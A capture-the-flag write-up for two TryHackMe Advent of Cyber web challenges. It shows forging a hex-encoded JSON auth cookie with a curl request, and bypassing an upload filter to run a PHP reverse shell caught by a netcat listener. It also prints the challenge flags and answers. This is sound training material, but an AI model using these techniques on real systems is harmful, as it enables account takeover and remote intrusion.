## Day 1: A Christmas Crisis

*Category: Web Exploitation*  
*Tags: HTTP, Cookies*  

> Understand how the web works and take back control of the Christmas Command Centre!

IP: `10.10.161.100`

### Basic enumeration

Firstly, I checked out the web server running on port 80 (HTTP).

I register for an account using the credentials `admin:bluemoon` and then log in with those credentials.

### What is the name of the the cookie used for authentication?

The name of the authentication cookie is: `auth`.

### What format is the value of this cookie encoded and what format is the data stored in?

The value of the auth cookie is: `7b22636f6d70616e79223a22546865204265737420466573746976616c20436f6d70616e79222c2022757365726e616d65223a2261646d696e227d`.  

Putting the entire thing into [CyberChef](https://gchq.github.io/CyberChef/), we find that it is using `hexadecimal` to encode the string: `{"company":"The Best Festival Company", "username":"admin"}`.  

The data is stored in `JSON` format.  

### Bypassing the authentication

We can encode `{"company":"The Best Festival Company", "username":"santa"}` into hexadecimal to find the value of santa's authentication token.  

Value of the santa cookie: `7b22636f6d70616e79223a22546865204265737420466573746976616c20436f6d70616e79222c2022757365726e616d65223a2273616e7461227d`.  

After setting the auth cookie to that string, we get access to the santa account and full control panel access.

### Getting the flag

I'm not sure why but I got a bit stuck here. Turns out, you just flick all the switches and you get the final flag: `THM{MjY0Yzg5NTJmY2Q1NzM1NjBmZWFhYmQy}`.

### Making a [solve script](day01-christmas-crisis/solve.sh)

I noticed that the program sends a post request to `http://10.10.161.100/api/checkflag`. I noticed it also sent the cookie along with it. Therefore, I decided to send a POST request to the URL with the cookie and lo and behold, the flag! Here, I did it using curl in bash:  
```bash
curl -X POST -H "Cookie: auth=7b22636f6d70616e79223a22546865204265737420466573746976616c20436f6d70616e79222c2022757365726e616d65223a2273616e7461227d" http://10.10.161.100/api/checkflag;
```
I have also included the shell script I wrote in the day01-christmas-crisis directory. 

## Day 2: The Elf Strikes Back

*Category: Web*  
*Tags: RCE*  

> Learn about basic file upload filter bypasses by performing a security audit on the new security management server!

IP: `10.10.119.58`

### Basic enumeration

Firstly, I checked the HTTP server running on port 80.

![screenshot](day02-elf-strikes-back/initial_page.png)

### What string of text needs added to the URL to get access to the upload page?

We can use the id given to us (`ODIzODI5MTNiYmYw`) to find an upload page at `http://10.10.119.58/?id=ODIzODI5MTNiYmYw`.

![screenshot](day02-elf-strikes-back/initial_page_id.png)

### What type of file is accepted by the site?

If we examine the source code, we find the following the the HTML code:
```HTML
<input type=file id="chooseFile" accept=".jpeg,.jpg,.png">
```
It turns out that this page only accepts image files.

### In which directory are the uploaded files stored?

After poking around in the address bar, I found that the uploads are kept in the `/uploads/` directory.  

We can find the uploaded files at `http://10.10.119.58/uploads/`.

### Getting a shell

Firstly, I wanted to find out what was running the web server. Therefore, I opened the network tab and reloaded the page to get the response headers.

![screenshot](day02-elf-strikes-back/network_tab.png)

We see that the server is running Apache 2.4.37 on CentOS powered by PHP. Therefore, I got a PHP reverse shell script from [Pentest Monkey](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php).  

Be sure to change the following lines in the PHP file:
```php
$ip = '127.0.0.1';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
```

Then, I renamed the file to `php-reverse-shell.jpg.php` to circumvent the checks and uploaded the file.

**Establishing the reverse shell connection**

Since I set the PHP reverse shell to connect on port 4444, I set up a netcat listener on that port.

```sh
nc -lvnp 4444
```

Finally, I visited the following URL `http://10.10.119.58/uploads/` to run the PHP script.  

I was then greated by this beautiful message:

```
Listening on 0.0.0.0 4444
Connection received on 10.10.119.58 54002
Linux security-server 4.18.0-193.28.1.el8_2.x86_64 #1 SMP Thu Oct 22 00:20:22 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux

uid=48(apache) gid=48(apache) groups=48(apache)
sh: cannot set terminal process group (823): Inappropriate ioctl for device
sh: no job control in this shell
sh-4.4$
```

Bingo! Now that we have a reverse shell, what next?

### What is the flag in /var/www/flag.txt?

First, I made sure I was successfully connected to the server:

```
sh-4.4$ whoami
whoami
apache
sh-4.4$ pwd
pwd
/
```

Now that we have a shell, we can read the flag:

```
sh-4.4$ cat /var/www/flag.txt
cat /var/www/flag.txt


==============================================================


You've reached the end of the Advent of Cyber, Day 2 -- hopefully you're enjoying yourself so far, and are learning lots! 
This is all from me, so I'm going to take the chance to thank the awesome @Vargnaar for his invaluable design lessons, without which the theming of the past two websites simply would not be the same. 


Have a flag -- you deserve it!
THM{MGU3Y2UyMGUwNjExYTY4NTAxOWJhMzhh}


Good luck on your mission (and maybe I'll see y'all again on Christmas Eve)!
 --Muiri (@MuirlandOracle)

```

And so with that, we get a nice message and the flag: `THM{MGU3Y2UyMGUwNjExYTY4NTAxOWJhMzhh}`.
